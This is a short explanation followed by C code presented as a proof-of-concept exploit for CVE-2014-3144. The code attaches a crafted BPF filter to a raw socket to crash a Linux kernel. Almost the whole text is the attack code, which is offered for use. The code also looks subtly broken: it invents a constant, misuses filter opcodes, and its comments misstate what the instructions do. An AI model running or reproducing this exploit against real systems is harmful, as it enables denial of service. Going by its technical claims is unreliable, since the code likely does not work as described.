Based on public advisories for CVE-2014-3144, the following C code serves as a proof-of-concept to trigger the vulnerability. It attaches a crafted BPF filter to a socket. The filter uses a negative offset (`-1`), which causes an integer underflow in the kernel when processing netlink attributes, leading to a system crash (Denial of Service).

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/filter.h>
#include <linux/if_packet.h>

/* BPF_S_ANC_NLATTR is not in the system headers */
#ifndef BPF_S_ANC_NLATTR
#define BPF_S_ANC_NLATTR 12
#endif

int main(void)
{
    int fd;
    struct sock_filter code[] = {
        { BPF_LD  | BPF_W | BPF_ABS,  0, 0, 0xffffffff }, /* A = -1 */
        { BPF_LD  | BPF_W | BPF_LEN,  0, 0, BPF_S_ANC_NLATTR },
        { BPF_RET | BPF_A,            0, 0, 0 },
    };

    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(code) / sizeof(code[0])),
        .filter = code,
    };

    printf("Opening a socket...\n");
    fd = socket(AF_PACKET, SOCK_RAW, 0);
    if (fd < 0) {
        perror("socket");
        return 1;
    }

    printf("Attaching the BPF filter...\n");
    if (setsockopt(fd, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) < 0) {
        perror("setsockopt");
        close(fd);
        return 1;
    }

    printf("BPF filter attached. The vulnerability should be triggered by network activity.\n");
    printf("You may need to generate some network traffic to trigger the filter.\n");

    // The kernel will panic when the filter is executed on a received packet.
    // We can just sleep here to wait for it.
    sleep(10);

    close(fd);
    return 0;
}
```

